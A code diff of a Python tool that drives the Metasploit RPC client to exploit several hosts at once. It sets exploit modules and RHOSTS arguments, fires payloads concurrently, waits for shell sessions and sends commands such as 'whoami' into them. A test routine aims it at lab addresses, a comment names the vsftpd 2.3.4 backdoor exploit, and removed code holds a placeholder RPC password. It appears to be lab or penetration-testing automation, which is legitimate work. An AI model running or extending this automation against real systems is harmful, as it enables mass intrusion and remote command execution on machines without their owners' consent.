@@ -130,17 +130,6 @@ class Console:
         logging.error(f"invalid module selected -> {module_name}")
         return False
 
-    def set_payload(self, payload_path):
-        if not self.is_valid_module(payload_path):
-            logging.error("payload has not been set")
-            return        
-        self.exploit = self.client.modules.use('exploit', payload_path)
-        
-    def set_arguments(self, arguments):
-        if self.exploit is None: return
-        for argument in arguments.keys():
-            self.exploit[argument] = arguments[argument]
-
     def get_session_id(self, ip):
         logging.info(f"current sessions data -> {self.client.sessions.list}")
         for id in self.client.sessions.list.keys():
@@ -155,83 +144,11 @@ class Console:
                 return (True, session_id)
         return (False, None)
     
-    async def run_payloads(self, targets: dict):
-        """
-        targets = {"ip": (payload, shell, arguments)}
-        """
-        result = {}
-        tasks = []
-        for target in targets:
-            payload, shell, arguments = targets[target]
-            result[target] = {}
-            if not self.is_valid_module(payload):
-                result[target]["success"] = False
-                result[target]["reason"] = "INVALID_MODULE"
-                continue
-            self.set_payload(payload)
-            self.set_arguments(arguments)
-            # session_id = await self.run_payload(shell, target)
-            tasks.append(self.run_payload(shell, target))
-            logging.info(f"payload sent for -> {target}") 
-        results = await asyncio.gather(*tasks)
-        for result in results:
-            logging.info(result)
-
-    async def run_payload(self, shell_path, ip):
-        if self.exploit is None: return
-        is_exploited, session_id = self.is_exploited(ip)
-        if is_exploited:
-            logging.warning(f"target {ip} already has a session; session_id -> {session_id} ")
-            return session_id
-
-        exploit_result = self.exploit.execute(payload=shell_path)
-        self.attempts[ip] = exploit_result
-        exploit_result["ip"] = ip
-        completed = False
-        while not completed:
-            logging.info(f"checking status for job -> {exploit_result['job_id']}")
-            completed, session_id = await self.is_job_completed(ip)
-            await asyncio.sleep(1)
-
-        if exploit_result["job_id"] == None or session_id == None:
-            logging.error("payload failed")
-            return
-        return session_id
-
-    async def interact(self, session_id, command, ip):
-        logging.info("trying to interact: " + str(session_id))
-        logging.info(type(session_id))
-        client = MsfRpcClient('yourpassword',ssl=True)
-        session_id = session_id
-        for id in client.sessions.list.keys():
-            if client.sessions.list[id]["session_host"] == ip:
-                session_id = id  
-        shell = client.sessions.session(session_id)
-        logging.info(shell)
-        logging.info(shell.write(command))
-        logging.info(shell.read())
-        logging.info(self.rpc.call("session.list"))
+    def bulk_interact(self):
+        pass
         
     def get_sessions(self):
         return self.client.sessions.list
-    
-    async def exploit_test(self, ip, path):
-        logging.info("before: "+str(self.client.sessions.list))
-        #exploit = self.client.modules.use('exploit', "unix/ftp/vsftpd_234_backdoor")
-        self.set_payload(path)
-        # self.set_payload('exploit/linux/postgres/postgres_payload')
-        self.set_arguments({
-            "RHOSTS":ip
-        })
-        #exploit_result = exploit.execute(payload='cmd/unix/interact')
-        session_id = await self.run_payload('cmd/unix/interact',ip)
-        if session_id is None: return
-        logging.info("after: "+str(self.client.sessions.list))
-        await self.interact(session_id, "whoami",ip)
-        # print(client.sessions.list)
-        # shell = client.sessions.session('1')
-        # shell.write('whoami')
-        # print(shell.read())
 
     async def test(self):
         logging.info("before: "+str(self.client.sessions.list))
@@ -267,6 +184,10 @@ class Console:
         target1.set_arguments({"RHOSTS":"192.168.17.130"})
         target2.set_arguments({"RHOSTS":"192.168.17.131"})
         await asyncio.gather(target1.run_payload("cmd/unix/interact"), target2.run_payload("cmd/unix/interact"))
+        target1.interact("whoami")
+        logging.info("waiting for 5 seconds")
+        await asyncio.sleep(5)
+        target1.interact("whoami")
         # await self.run_payloads(targets)
 
 class Target:
@@ -275,7 +196,9 @@ class Target:
         self.ip = ip
         self.console = console
         self.exploit = None
+        self.is_exploited = False
         self.exploit_result = {}
+        self.session_id = None
 
     def set_payload(self, mtype, mname):
         if not self.console.is_valid_module(mname):
@@ -335,9 +258,18 @@ class Target:
             logging.info("job is still running")
             return (False, None)
         if (not is_job and is_session) or (is_job and is_session):
+            self.is_exploited = True
+            self.session_id = session_id
             logging.info("job completed and a session was created")
             logging.info(f"sesion_id -> {session_id}")
             return (True, session_id)
         if not is_job and not is_session:
             logging.warning("job completed but no session was created")
             return (True, None)
+        
+    async def interact(self, command):
+        if not self.is_exploited: return
+        logging.info("trying to interact: " + str(self.session_id))
+        shell = self.console.client.sessions.session(self.session_id)
+        logging.info(shell.write(command))
+        logging.info(shell.read())
